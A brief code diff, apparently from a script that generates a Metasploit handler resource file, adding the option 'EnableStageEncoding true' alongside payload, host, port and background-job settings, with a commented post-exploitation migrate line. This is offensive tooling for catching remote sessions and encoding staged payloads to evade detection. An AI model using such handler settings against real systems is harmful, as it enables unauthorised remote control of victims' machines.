@@ -162,6 +162,7 @@ set PAYLOAD ${PAYLOAD}
 set ${HOST} ${IP}
 set LPORT ${PORT}
 set ExitOnSession false
+set EnableStageEncoding true
 #set AutoRunScript 'post/windows/manage/migrate'
 run -j
 EOF
